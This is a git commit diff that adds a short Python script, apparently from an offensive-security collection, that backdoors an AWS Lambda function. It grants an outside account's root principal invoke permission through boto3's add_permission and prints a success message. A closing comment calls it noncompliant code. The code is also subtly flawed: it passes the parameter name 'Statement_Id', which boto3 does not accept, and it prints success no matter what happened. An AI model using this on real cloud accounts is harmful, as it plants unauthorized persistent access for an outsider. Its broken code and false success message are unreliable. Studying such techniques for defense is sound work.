15f4a4ed01623886fa294215ccebdd2ab59e5a4f
NextGenSec <142174128+NextGenSec-Github@users.noreply.github.com>
2024-04-05 22:11:01 +0500

    Update backdoor_lambda_function.py

--- aws/Offensive Security on AWS/Scripts/backdoor_lambda_function.py
+++ aws/Offensive Security on AWS/Scripts/backdoor_lambda_function.py
@@ -1,1 +1,30 @@
+import boto3
+
+def backdoor_lambda_function(function_name, external_account_id):
+  lambda_client = boto3.client('lambda')
+  response = lambda_client.add_permission(
+    FunctionName=function_name,
+    Statement_Id='backdoor',
+    Action='lambda:InvokeFunction',
+    Principal='arn:aws:iam::' + external_account_id + ':root'
+  )
+
+
+print("Lambda function backdoored successfully.")
+
+# Test
+backdoor_lambda_function('my-function', '123456789012')
+
+
+'''
+- The noncompliant code uses the AWS SDK’s add_permission method to modify the resource-based policy of the Lambda function.
+- It adds a permission statement that allows the specified external AWS account to invoke the function.
+'''
+
+
+
+
+
+
+
 
